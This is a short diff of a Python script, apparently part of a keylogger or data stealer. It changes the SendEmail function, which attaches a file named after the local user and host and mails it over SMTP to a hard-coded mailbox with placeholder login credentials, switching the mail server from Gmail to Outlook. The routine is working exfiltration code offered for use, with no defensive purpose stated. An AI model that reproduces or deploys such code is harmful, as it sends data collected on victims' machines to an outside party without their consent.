@@ -120,7 +120,7 @@ def AddingInformation(file, information):
 
 
 def SendEmail(user, host):
-    destinatary_email = "<your_gmail>"
+    destinatary_email = "<your_email>"
     message = MIMEMultipart()
     message['to'] = destinatary_email
     message['from'] = destinatary_email
@@ -130,7 +130,7 @@ def SendEmail(user, host):
     attached_file.add_header('Content-Disposition', 'attachment', filename="{}@{}.txt".format(user, host))
     message.attach(attached_file)
     readding_file.close()
-    server = smtplib.SMTP("smtp.gmail.com", 587)
+    server = smtplib.SMTP("smtp-mail.outlook.com", 587)
     server.starttls()
     server.login(destinatary_email,"<your_password>")
     server.sendmail(message['from'], message['to'], message.as_string())
